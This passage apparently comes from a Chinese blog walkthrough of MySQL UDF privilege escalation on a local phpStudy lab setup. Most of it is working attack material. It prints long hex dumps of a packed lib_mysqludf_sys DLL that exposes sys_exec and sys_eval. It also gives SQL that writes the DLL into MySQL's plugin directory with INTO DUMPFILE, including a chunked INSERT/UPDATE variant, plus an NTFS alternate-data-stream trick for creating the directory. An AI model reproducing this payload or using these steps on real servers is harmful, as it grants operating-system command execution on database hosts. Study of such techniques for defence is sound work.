A041592947A626231C0FD8CF53188186D9EF0D68295A4A148A8EF8ECECCDD64427CB1366EB75B908674B32D21DEA902D3A1C1128106464200A8B83AF334463971BCB36E418C323DB83A238243D05F62809993959B611402BDC678C90C136DE1BC3017F37320296247F15F4F6120D6276D81BC00383E8013C2075643F289C8D3D53041A787F4B8D1D4C068D13A08491790EC372B3326129A9EF4F137F2344720CC96681394D5A75FCB7C3FF174863513C813C0A5045E1137C0A180B020F94C063E343029F4C63413CFEC9B4EBED8D7ED24C03C1413C4014450458064525FFC25F6A4AB10018741F8B510B3BD2720A8B4108ED6FF8DB03C209D072104183C113C128453BCB72E16FC796B05D1CC1C3CF4CC1267AF7446992E1DA85DCBD1F4C2BC15FEAFB5ABED0140CCD0F3A24C1E81F600D2CFEF7D083E001EB02584FD644AB360196EBCAC0B66C3008EEC18B01A7FFAA128D3CC77627252205CC11CE78DCA606CB113F75463DA70FF0DD4603241B471EB801000000277C29847F3FE520000081BFF83C3DFC32A2DF2D992B7DC7F83074149D6FA3D00E7F5DC6268B2DC285586B212430BC6286B6489934E10AB9B4C856E04671D849460BB50E731C0EB110D9BE10A8D813FE6A4CB84C33DBCEB8FF00856037BA1623E9B8338975DDE016B1DF744D44D89C1D39B705DBDD8449F7D3093720D2FBDC4B4646463605DEE0E2E4B24746465E505A11000055C9A8AA298064547FB017D8069017303007D04E6F206172FFFFDFFE67756D656E7473096C6C6F77656420287564663A206C69625F6D79730BF6B7DD716C0D5F73085F696E666F29411C80EDFF232076657273696F6E20302E0134EDEDEE17A178706563744B657861076C79201A6DBB7DFB652073747243672074791B2070766175D8299B6D21724F2F7477996D60010B1F438EF6F603FB72206E616D4C436F756C246E6F74CCE8B66D3B63611320186D27796372FF850740310106023532023001240D0024F6FFB7FFD407001FC408001A740B15640C0010540B000B340A0004822776BBDCFE1918090018C40F13740E640B093427B763D4ED046217D41E5E3F1903241AEDBACF2C5007390F2A07801ABBDC6E8367165B16743711640C340B7BD85B770442130C390C01118350118B9B6DF705530133871C03E4001D5D90ED60430E057B743F09BAEEB0D80401072F67079403A06077DBC10701462F462B1074092F0DB6D94E3416033B01000715BB0BB6BD971574062F64F7DF21000884DDB640AE043439741F00BF20EEECEDB6140629034C341F0BA903E1C2DEBE240F05C305340A13234BD36D9B6E23431E14C45F0F470A75B713760554094B01098909A2071E7DE572BB1F1E742F12640D34870142B71582BB2E1311CF0C03CA96DD0E01380F387427005124A3AAFEC10246DDCD5D20D266D4FF555516C900178FA02A1B003011764BD56C039180BFA007E0126DD79DDD03703407F803680B0013026A76FBBA8603540B14021814170B581590FB2F07D9EEECF60A150310340727030034075BD5B9DD7003E0336F0724B3CC755DD7750B30074203AC0B9007F5B61B94DB03C03233920C1903C8BA05A0EB0B10074F8BE80B508375AFEB077303444707990BA0B65DD77507E503280BF0073A1C033C0038B7EB0B5007F71CA70B77B63BDB8B191D2F2007381DCB40071DAC7B5D83036C8307D30B601E9DED5EB3039B7C5F07C11E3BE0D0AE3BDB07</span>
<span class="hljs-number">031</span>F3B1007D6039C33CA1255954A005525A3AAA8AA9251645455C9D09BA0887C0402C4FF16360157616974466F7253AC7F2B40FC6C654F626ABD14566972747561F63703C46C419A0D536574456E76126DBF01E26F6EE45661726961622B41EB2E40BC18437265B8546806640DF65BF76D47264375727222502A636573734914E283CD1226135469636BB6FD6E03026E6B517565727950036684DEDBB1F66D616E3716657218446973676FDBDBCF374C6962727879436192731A52746C633BB76D0970A2722D2C7874124CBDB5ADFD6F6F6B7570463EC26916B2747279DFB5078B17CD556E77E47E4973446562736F6BED75676763A7A56583E11DFEB6B77268616E64457883704046696CA56C85C58719F19319DAB61254176D65151153DAF6586B39352B537973176DFA81E87517454173426509A3DBFE434388A0895F616D73675FCC6990B3850BBF5F5F435F73708B6966285F7E267CDB766F5F64116F035F706F6922430B76DB2663DA5F64CE280009626B31142D325F7A13C417840B5F7B50705B6C735F330A6C212205DB5ACCD82A58096E73ED6BC982130FD76D643ED6BAD6DE756C343F15416D170CDEA3E0020AB52689A3B565C933A196063BC16DB15B0772652508661115080D5BA1739C29709F73149BB5ADB93932AE6E074D0F85D7BADBC56F736A663A70105E3B84ED70705831747B6D343FDF15F4C700F08C21180800E264860600A76EFB0FE327A15AE6F00022200B020808120CB07744B314132E0010000005CF1E6C9B02020433050002088000C302F663146D160100022E063AF76C650F0A50394330908DE8DB88223C1460E2D880D4BD0118020183703AACBB024B00303A011E4644A42B2E1054822D3BD810901200DC00B3DBC63B6F602E7264A76108550B53597761DD000C03162740022E26291B61F600D805100C22273616ECECC02E702850EB27244FD820FC007273726300136027B3C7013226650942FCA664B0702728421B4036C08D6D05CA7212D3060000000000009000FF0048894C240848895424104C8944241880FA010F854502000053565755488D35CDF0FFFF488DBE0080FFFF5731DB31C94883CDFFE85000000001DB7402F3C38B1E4883EEFC11DB8A16F3C3488D042F83F9058A1076214883FDFC771B83E9048B104883C00483E9048917488D7F0473EF83C1048A10741048FFC0881783E9018A10488D7F0175F0F3C3FC415BEB0848FFC6881748FFC78A1601DB750A8B1E4883EEFC11DB8A1672E68D410141FFD311C001DB750A8B1E4883EEFC11DB8A1673EB83E8037217C1E0080FB6D209D048FFC683F0FF0F843A0000004863E88D410141FFD311C941FFD311C9751889C183C00241FFD311C901DB75088B1E4883EEFC11DB73ED4881FD00F3FFFF11C1E83AFFFFFFEB835E4889F7B900120000B2004889FBEB2C8A074883C7013C80720A3C8F7706807FFE0F74062CE83C0177233817751F8B072500FFFFFF0FC829F801D8AB4883E9048A074883C70148FFC975D9EB0548FFC975BE4883EC28488DBE007000008B0709C0744F8B5F04488D8C30B0A100004801F34883C708FF96ECA1000048958A0748FFC708C074D74889F94889FAFFC8F2AE4889E9FF96F4A100004809C074094889034883C308EBD64883C4285D5F5E5B31C0C34883C4284883C704488D5EFC31C08A0748FFC709C074233CEF77114801C3488B03480FC84801F0488903EBE0240FC1E010668B074883C702EBE1488BAEFCA10000488DBE00F0FFFFBB00100000504989E141B8040000004889DA4889F94883EC20FFD5488D871702000080207F8060287F4C8D4C24204D8B014889DA4889F9FFD54883C4285D5F5E5B488D4424806A004839C475F94883EC804C8B442418488B542410488B4C2408E91F79FFFF000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000010018000000180000800000000000000000040000000000010002000000300000800000000000000000040000000000010009040000480000005CB0000054010000E404000000000000586000003C617373656D626C7920786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E763122206D616E696665737456657273696F6E3D22312E30223E0D0A20203C646570656E64656E63793E0D0A202020203C646570656E64656E74417373656D626C793E0D0A2020202020203C617373656D626C794964656E7469747920747970653D2277696E333222206E616D653D224D6963726F736F66742E564338302E435254222076657273696F6E3D22382E302E35303630382E30222070726F636573736F724172636869746563747572653D22616D64363422207075626C69634B6579546F6B656E3D2231666338623362396131653138653362223E3C2F617373656D626C794964656E746974793E0D0A202020203C2F646570656E64656E74417373656D626C793E0D0A20203C2F646570656E64656E63793E0D0A3C2F617373656D626C793E0000000000000000000000002CB20000ECB1000000000000000000000000000039B200001CB20000000000000000000000000000000000000000000044B200000000000052B200000000000062B200000000000072B200000000000080B200000000000000000000000000008EB200000000000000000000000000004B45524E454C33322E444C4C004D5356435238302E646C6C00004C6F61644C69627261727941000047657450726F634164647265737300005669727475616C50726F7465637400005669727475616C416C6C6F6300005669727475616C46726565000000667265650000000000000000A727A15A0000000074B30000010000001200000012000000C0B2000008B3000050B300007010000060100000001000008015000060100000701500002014000060100000901300000014000060100000901300003011000060100000C010000000130000E0120000A011000089B300009FB30000BCB30000D7B30000E3B30000F6B3000007B4000010B4000020B400002EB4000037B4000047B4000055B400005DB400006CB4000079B4000081B4000090B4000000000100020003000400050006000700080009000A000B000C000D000E000F00100011006C69625F6D7973716C7564665F7379732E646C6C006C69625F6D7973716C7564665F7379735F696E666F006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F5F696E6974007379735F62696E6576616C007379735F62696E6576616C5F6465696E6974007379735F62696E6576616C5F696E6974007379735F6576616C007379735F6576616C5F6465696E6974007379735F6576616C5F696E6974007379735F65786563007379735F657865635F6465696E6974007379735F657865635F696E6974007379735F676574007379735F6765745F6465696E6974007379735F6765745F696E6974007379735F736574007379735F7365745F6465696E6974007379735F7365745F696E69740000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 <span class="hljs-keyword">into</span> dumpfile "C:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin\\udf.dll";</code></pre>
<p>本以为可以顺利做下去了，结果竟然没有plugin目录，这里也很疑惑，明明cmd查询到的，服了，这下得手动创建了（没有那味儿了）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230925204934434.png" alt="image-20230925204934434"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230925205014663.png" alt="image-20230925205014663"></p>
<h5 id="515-创建一个表并将二进制数据插入到十六进制编码流">5.1.5 创建一个表并将二进制数据插入到十六进制编码流</h5>
<p>如果在低版本系统环境下（win2003）或部分特殊环境使用mysql命令提示符进行提权操作，由于不同环境下的mysql命令提示符可输入字符最大长度不同（win2003为8191，win10系统为65535），无法使用dumpfile一次性写入全部16进制字符，则需要将udf文件的16进制编码字符先进行切割，再拼接写入到一个表中，最后导出到目标系统。</p>
<p>注意：在进行16进制数据切割时，每段字符的长度要为4的倍数，2进制转为16进制使用<strong>取四合一</strong>法，如果位数不够会在最高位补0，补0后会破坏原始二进制文件的文件结构导致利用失败，这也是很多人此方法复现失败的原因。</p>
<h5 id="516-随便选择一个数据库后创建一个表">5.1.6 随便选择一个数据库后，创建一个表</h5>
<pre><code class="hljs sql">use test;
<span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> udf(data longblob);</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230925205239370.png" alt="image-20230925205239370"></p>
<p>这里我是新建了一个数据库</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230925205329215.png" alt="image-20230925205329215"></p>
<h5 id="517-insert插入第一段数据">5.1.7 insert插入第一段数据</h5>
<p>当然这里如果你的数据长度恰好的话，直接插入也是可以的</p>
<pre><code class="hljs sql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> udf(data) <span class="hljs-keyword">values</span> (<span class="hljs-number">0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000E80000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000677CBFDA231DD189231DD189231DD18904DBBF89211DD18904DBBC892A1DD18904DBAA89261DD189231DD0890F1DD18904DBAC89211DD18904DBA089221DD18904DBAB89221DD18904DBA989221DD18952696368231DD189000000000000000000000000000000005045000064860300A727A15A0000000000000000F00022200B020800002000000010000000800000109F000000900000000000100000000000100000000200000400000000000000050002000000000000C000000010000000000000020000000000100000000000001000000000000000001000000000000010000000000000000000001000000098B2000008020000B0B10000E800000000B00000B00100000050000050010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000800000001000000000000000040000000000000000000000000000800000E0555058310000000000200000009000000012000000040000000000000000000000000000400000E02E727372630000000010000000B000000006000000160000000000000000000000000000400000C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332E393100555058210D240209E1E421439D3BDFB7DE7400000F0F0000002A0000490000D41DE9FEFF833A007450488B05A421000049890009A24008CD4973D20A9F109C1899CD9F34272096280FB70593666D83FDB7410B30B001C332C0C3CC00C215CC92C9BA810034716A6FEBCC16E46C096A471853FDBF1FA4631C0FB605591688401E41C7011E00FFED6DD62B8B63BF01750F3F42088338007506C64B26EBDC01017B4E2D632B05B9E4B228CE25227ED20CD26F1F28152AB001C3F66D7BC2BF83EC38344A43895C243084B7FFF6DBD90B09FF15C71F2B4885C04C8BD87512104C24DF6EAEB9608707202DC4388E897C242873EDCDFD33C048C7C1FF0033FBF2AE1C120976D9B75B1AF7D122E901890B2DCC00BE6FEB166F28E3026E404848DEDA7FDB29F938D87459488D0D40EE4E0E813832983DE4C1EB81403281480A9EE4435E4F81503281543281563261F37D4FB0018C48804028C34C49467607744E61DEED584917E49260680A703C6527CD18782056C740045CF8BF33B64342188B48048B008D4C010239BD1E77D27D8BD947107543706D8045EC1BE936130309884370900A00B69DEE10C8980A18BC0CB3C6B00E07103FBCB37DDB0F49A585C974066F5D17B7086D21CF93CF047424ADA3B9772D7110448B6949E2FA02C2EDDFBA52E2CE0212498D5C3001E83F0FFCE85CD7FDDD5FEBCB418B03C60430D2470D5734B70C58D7E22D0822D34313167BB75BCE2618007CA01CFF56677C84842F7198F4CF16C64373870D087C8C03D6E4240F79561E541E511E7292939C4E1E4B1E481E63C2425E3E1E1FCF2784EE87C71F1DA0981F4C89C68685EE44241824580F6C59897486BB86DB76381764BDB900D34C18284CB0DB7E302D4D8BF146E8E7B901EE9B6DC1EC04E00DDA4533ED4488670BEEF69B4FF04C39290F8413050673F215FDCFB8B9169125AC1C088BE8747B418D5508E1C9B6B13AC0E6CC177C7466A04B6640FA50669047FC3F42858E1B0B9529328D7936CE6F7D61C16C304375CD8CC74803C8F56636B724D470143E51C5BA08E1D9B68D39CC1CEB13225975AD886CDBB6F050EB258BC77004CD1930DDFE9CDB803E30E2154874229245FFB176D8827811FEF5887EDD4D174EBE5A0EEBC18424805EC606E71ADA0001380C4C38F12A10F8386C04C6F0A0581A87E792317FD3DC5CD8D6D09D58747A28F2023F73B773DF3E448D48406E41B80010B3748BD1F10DF7C7ED33C9AB441A5356104CEFA2DBE6B66C02C8D8154E1B8D54B94C350AEDE98D054A75890BA3B16E3B2DBC3133D2C7D0208925183BDF19B7B3BAD2C80DF2199D30AC581E29EB081433C0922FB384F13BE0064CEB0033C029001BB0DFB65538EC024510FF10C9196600FB6F7F6C900390483B0D89293F751148C1C11066F7DDDD6FDFB87502F3DAC1C910E9150AECCC405361203B8B7D1B5801A05FDCD25B0BFBEEF7F685DBC905112FD005020675098D430185BB76EFB6205B42C703D59B0D3C48B406634136670B1C5805B12006615BD85BC3CF55D27F6CC7C7C376FC608468E140DCFBF1C2C63831E83BE141BDD20F8503EE46BB7408075EE428073C0F8E0D8DE6B61B6E2BC58ED3105FDCFD3E76FB0FB12D602E0A741EF290B9E803C91D19BFDB36931D4275E841320783F802740FB9EF6DC3B31FB70ECA0208E2ED0D2F2E338E740FD2111912F874491412FC18DADC0B1FD958F847DF72165F1803B6BB2D701E4AD0C9EB081573ED12ECF6BEDBCF2774192D06429BD72D0698FBFB66D833DB891DB80E871DB906716FC7FEB59806E5413BD5DDE26541042530BB7DBBBD002C0978081E8BF3F048B93D883072B0B7920A63C7741AD64618D7D29B2F1C6B75E3EB037BF5A79A5ED6390C950CDAEB3FEA1F9F7DB7F08E8F080644892D312D1BC485C0678FED62771A15E5DE0DD6181ABE7FDDBBEEC7050725024585F67507B404BB833D14DDC96E73068B212A0B2D5C6F11DEDD264FE3029CF12C66012D3A273E9E9EBE10C58F38D240E468EC98717A60DCE91748C3B14D22190F6C20483A5ADBF308505851F0DD05BBEE77DF3D041F208915D12695D275133915D709ED7F38C3750B5A17C61E83FA017405040ADD6BE00275338931D39D08A3B71B0D34C84E20C574134AC68B07863DB9D7A64BFC1616E0C9016B3C1A0EDC83FFB092EBDA1535AB311BC11BDB5B0BD80C430C1DC817084D7BF787755C0B1841FFD385FF88FF03753970F79D75094A08AEEB8D1CA51E36EC648B171028ADEB06D8192ECC298ADC25F3008BC3659E8793708B218B8BF8B59D9E2A4055BF15EAA3894D7AFAB61B01018B080724B0D67D5D902DD9C2302F5E7D0AB1485825FF4DDB960C1E92387D2EDA02F101D7136FA3F875056C0CFCFA7D918844A4FD258B036983EB2F9E8E090CEFC6F852A1899E2681EC880068CD760DBFFE73153F156705B8C648F25845B7390CB8283D1F2C586170C339DEF61624EB754148B73DC6364238004044230430090E662FCF40280578254703055C73874C1C51494E7D4BB1077F4BF0EB222B8093447BDD837D738D0E83C00812D13E8D67DB7B642A059B240D20902F9C5BA25B701C2A7214097BC009CC3E1E666C926724766E833572DBFF0B70DC7A142F482C38B0BB2493827B8EF083D2396A14019B15650CCB36DC9255B624C80A271B83D76C1854BA6A234E336B1784F781C4ACA041592947A626231C0FD8CF53188186D9EF0D68295A4A148A8EF8ECECCDD64427CB1366EB75B908674B32D21DEA902D3A1C1128106464200A8B83AF334463971BCB36E418C323DB83A238243D05F62809993959B611402BDC678C90C136DE1BC3017F37320296247F15F4F6120D6276D81BC00383E8013C2075643F289C8D3D53041A787F4B8D1D4C068D13A08491790EC372B3326129A9EF4F137F2344720CC96681394D5A75FCB7C3FF174863513C813C0A5045E1137C0A180B020F94C063E343029F4C63413CFEC9B4EBED8D7ED24C03C1413C4014450458064525FFC25F6A4AB10018741F8B510B3BD2720A8B4108ED6FF8DB03C209D072104183C113C128453BCB72E16FC796B05D1CC1C3CF4CC1267AF7446992E1DA85DCBD1F4C2BC15FEAFB5ABED0140CCD0F3A24C1E81F600D2CFEF7D083E001EB02584FD644AB360196EBCAC0B66C3008EEC18B01A7FFAA128D3CC77627252205CC11CE78DCA606CB113F75463DA70FF0DD4603241B471EB801000000277C29847F3FE520000081BFF83C3DFC32A2DF2D992B7DC7F83074149D6FA3D00E7F5DC6268B2DC285586B212430BC6286B6489934E10AB9B4C856E04671D849460BB50E731C0EB110D9BE10A8D813FE6A4CB84C33DBCEB8FF00856037BA1623E9B8338975DDE016B1DF744D44D89C1D39B705DBDD8449F7D3093720D2FBDC4B4646463605DEE0E2E4B24746465E505A11000055C9A8AA298064547FB017D8069017303007D04E6F206172FFFFDFFE67756D656E7473096C6C6F77656420287564663A206C69625F6D79730BF6B7DD716C0D5F73085F696E666F29411C80EDFF232076657273696F6E20302E0134EDEDEE17A178706563744B657861076C79201A6DBB7DFB652073747243672074791B2070766175D8299B6D21724F2F7477996D60010B1F438EF6F603FB72206E616D4C436F756C246E6F74CCE8B66D3B63611320186D27796372FF850740310106023532023001240D0024F6FFB7FFD407001FC408001A740B15640C0010540B000B340A0004822776BBDCFE1918090018C40F13740E640B093427B763D4ED046217D41E5E3F1903241AEDBACF2C5007390F2A07801ABBDC6E8367165B16743711640C340B7BD85B770442130C390C01118350118B9B6DF705530133871C03E4001D5D90ED60430E057B743F09BAEEB0D80401072F67079403A06077DBC10701462F462B1074092F0DB6D94E3416033B01000715BB0BB6BD971574062F64F7DF21000884DDB640AE043439741F00BF20EEECEDB6140629034C341F0BA903E1C2DEBE240F05C305340A13234BD36D9B6E23431E14C45F0F470A75B713760554094B01098909A2071E7DE572BB1F1E742F12640D34870142B71582BB2E1311CF0C03CA96DD0E01380F387427005124A3AAFEC10246DDCD5D20D266D4FF555516C900178FA02A1B003011764BD56C039180BFA007E0126DD79DDD03703407F803680B0013026A76FBBA8603540B14021814170B581590FB2F07D9EEECF60A150310340727030034075BD5B9DD7003E0336F0724B3CC755DD7750B30074203AC0B9007F5B61B94DB03C03233920C1903C8BA05A0EB0B10074F8BE80B508375AFEB077303444707990BA0B65DD77507E503280BF0073A1C033C0038B7EB0B5007F71CA70B77B63BDB8B191D2F2007381DCB40071DAC7B5D83036C8307D30B601E9DED5EB3039B7C5F07C11E3BE0D0AE3BDB07</span>);</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230925205929909.png" alt="image-20230925205929909"></p>
<h5 id="518-update拼接剩余数据">5.1.8 update拼接剩余数据</h5>
<pre><code class="hljs sql"><span class="hljs-keyword">update</span> udf <span class="hljs-keyword">set</span> data <span class="hljs-operator">=</span> concat(data, <span class="hljs-number">0x031F3B1007D6039C33CA1255954A005525A3AAA8AA9251645455C9D09BA0887C0402C4FF16360157616974466F7253AC7F2B40FC6C654F626ABD14566972747561F63703C46C419A0D536574456E76126DBF01E26F6EE45661726961622B41EB2E40BC18437265B8546806640DF65BF76D47264375727222502A636573734914E283CD1226135469636BB6FD6E03026E6B517565727950036684DEDBB1F66D616E3716657218446973676FDBDBCF374C6962727879436192731A52746C633BB76D0970A2722D2C7874124CBDB5ADFD6F6F6B7570463EC26916B2747279DFB5078B17CD556E77E47E4973446562736F6BED75676763A7A56583E11DFEB6B77268616E64457883704046696CA56C85C58719F19319DAB61254176D65151153DAF6586B39352B537973176DFA81E87517454173426509A3DBFE434388A0895F616D73675FCC6990B3850BBF5F5F435F73708B6966285F7E267CDB766F5F64116F035F706F6922430B76DB2663DA5F64CE280009626B31142D325F7A13C417840B5F7B50705B6C735F330A6C212205DB5ACCD82A58096E73ED6BC982130FD76D643ED6BAD6DE756C343F15416D170CDEA3E0020AB52689A3B565C933A196063BC16DB15B0772652508661115080D5BA1739C29709F73149BB5ADB93932AE6E074D0F85D7BADBC56F736A663A70105E3B84ED70705831747B6D343FDF15F4C700F08C21180800E264860600A76EFB0FE327A15AE6F00022200B020808120CB07744B314132E0010000005CF1E6C9B02020433050002088000C302F663146D160100022E063AF76C650F0A50394330908DE8DB88223C1460E2D880D4BD0118020183703AACBB024B00303A011E4644A42B2E1054822D3BD810901200DC00B3DBC63B6F602E7264A76108550B53597761DD000C03162740022E26291B61F600D805100C22273616ECECC02E702850EB27244FD820FC007273726300136027B3C7013226650942FCA664B0702728421B4036C08D6D05CA7212D3060000000000009000FF0048894C240848895424104C8944241880FA010F854502000053565755488D35CDF0FFFF488DBE0080FFFF5731DB31C94883CDFFE85000000001DB7402F3C38B1E4883EEFC11DB8A16F3C3488D042F83F9058A1076214883FDFC771B83E9048B104883C00483E9048917488D7F0473EF83C1048A10741048FFC0881783E9018A10488D7F0175F0F3C3FC415BEB0848FFC6881748FFC78A1601DB750A8B1E4883EEFC11DB8A1672E68D410141FFD311C001DB750A8B1E4883EEFC11DB8A1673EB83E8037217C1E0080FB6D209D048FFC683F0FF0F843A0000004863E88D410141FFD311C941FFD311C9751889C183C00241FFD311C901DB75088B1E4883EEFC11DB73ED4881FD00F3FFFF11C1E83AFFFFFFEB835E4889F7B900120000B2004889FBEB2C8A074883C7013C80720A3C8F7706807FFE0F74062CE83C0177233817751F8B072500FFFFFF0FC829F801D8AB4883E9048A074883C70148FFC975D9EB0548FFC975BE4883EC28488DBE007000008B0709C0744F8B5F04488D8C30B0A100004801F34883C708FF96ECA1000048958A0748FFC708C074D74889F94889FAFFC8F2AE4889E9FF96F4A100004809C074094889034883C308EBD64883C4285D5F5E5B31C0C34883C4284883C704488D5EFC31C08A0748FFC709C074233CEF77114801C3488B03480FC84801F0488903EBE0240FC1E010668B074883C702EBE1488BAEFCA10000488DBE00F0FFFFBB00100000504989E141B8040000004889DA4889F94883EC20FFD5488D871702000080207F8060287F4C8D4C24204D8B014889DA4889F9FFD54883C4285D5F5E5B488D4424806A004839C475F94883EC804C8B442418488B542410488B4C2408E91F79FFFF000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000010018000000180000800000000000000000040000000000010002000000300000800000000000000000040000000000010009040000480000005CB0000054010000E404000000000000586000003C617373656D626C7920786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E763122206D616E696665737456657273696F6E3D22312E30223E0D0A20203C646570656E64656E63793E0D0A202020203C646570656E64656E74417373656D626C793E0D0A2020202020203C617373656D626C794964656E7469747920747970653D2277696E333222206E616D653D224D6963726F736F66742E564338302E435254222076657273696F6E3D22382E302E35303630382E30222070726F636573736F724172636869746563747572653D22616D64363422207075626C69634B6579546F6B656E3D2231666338623362396131653138653362223E3C2F617373656D626C794964656E746974793E0D0A202020203C2F646570656E64656E74417373656D626C793E0D0A20203C2F646570656E64656E63793E0D0A3C2F617373656D626C793E0000000000000000000000002CB20000ECB1000000000000000000000000000039B200001CB20000000000000000000000000000000000000000000044B200000000000052B200000000000062B200000000000072B200000000000080B200000000000000000000000000008EB200000000000000000000000000004B45524E454C33322E444C4C004D5356435238302E646C6C00004C6F61644C69627261727941000047657450726F634164647265737300005669727475616C50726F7465637400005669727475616C416C6C6F6300005669727475616C46726565000000667265650000000000000000A727A15A0000000074B30000010000001200000012000000C0B2000008B3000050B300007010000060100000001000008015000060100000701500002014000060100000901300000014000060100000901300003011000060100000C010000000130000E0120000A011000089B300009FB30000BCB30000D7B30000E3B30000F6B3000007B4000010B4000020B400002EB4000037B4000047B4000055B400005DB400006CB4000079B4000081B4000090B4000000000100020003000400050006000700080009000A000B000C000D000E000F00100011006C69625F6D7973716C7564665F7379732E646C6C006C69625F6D7973716C7564665F7379735F696E666F006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F5F696E6974007379735F62696E6576616C007379735F62696E6576616C5F6465696E6974007379735F62696E6576616C5F696E6974007379735F6576616C007379735F6576616C5F6465696E6974007379735F6576616C5F696E6974007379735F65786563007379735F657865635F6465696E6974007379735F657865635F696E6974007379735F676574007379735F6765745F6465696E6974007379735F6765745F696E6974007379735F736574007379735F7365745F6465696E6974007379735F7365745F696E69740000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span>);</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230925205942481.png" alt="image-20230925205942481"></p>
<h5 id="519-导出表中数据到系统磁盘">5.1.9 导出表中数据到系统磁盘</h5>
<pre><code class="hljs sql"><span class="hljs-keyword">select</span> data <span class="hljs-keyword">from</span> udf <span class="hljs-keyword">into</span> dumpfile "C:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin\\udf.dll";</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230925210437927.png" alt="image-20230925210437927"></p>
<p>做到这里突然蒙蔽了，跟着文章做的，但是这里似乎又重复上传了一下，不理解是干嘛的。</p>
<p>我认为在5.1.5步骤之后应该是没有办法直接将udf文件传到plugin目录下的时候所应该有的，而该作者在5.1.5之前就已经靠sql语句写入到了plugin目录下，到这儿应该就是成功了吧，我不理解他的布局了，估计是混乱了</p>
<p><strong>5.1.3 查看 plugin 目录，不存在 lib\plugin目录但有webshell，可使用webshell创建lib\plugin目录。</strong></p>
<p><strong>5.1.4 查看 plugin 目录，不存在 lib\plugin目录也没有webshell，此时就要使用网传ADS文件流创建目录的方法了，上次听到这个名词还是在做upload-labs靶场的时候。</strong></p>
<p>ADS文件流是NTFS文件系统为了能与Mac系统下的HFS文件系统兼容而设计出的。</p>
<p>经实践在命令提示符下使用ADS文件流是可以成功创建目录或者文件名的，但在独立安装的mysql数据库环境与phpstudy自带mysql环境下均创建失败，并且查阅网上各种文章也都是没有利用成功的，严重怀疑是哪位小可爱臆想出来的，但为了文章完整性还是决定写出来。</p>
<p>可见没有webshell几乎不可能了</p>
<pre><code class="hljs powershell"><span class="hljs-built_in">echo</span> <span class="hljs-number">123</span> &gt;C:\phpstudy_pro\Extensions\MySQL5.<span class="hljs-number">7.26</span>\lib::<span class="hljs-variable">$INDEX_ALLOCATION</span></code></pre>
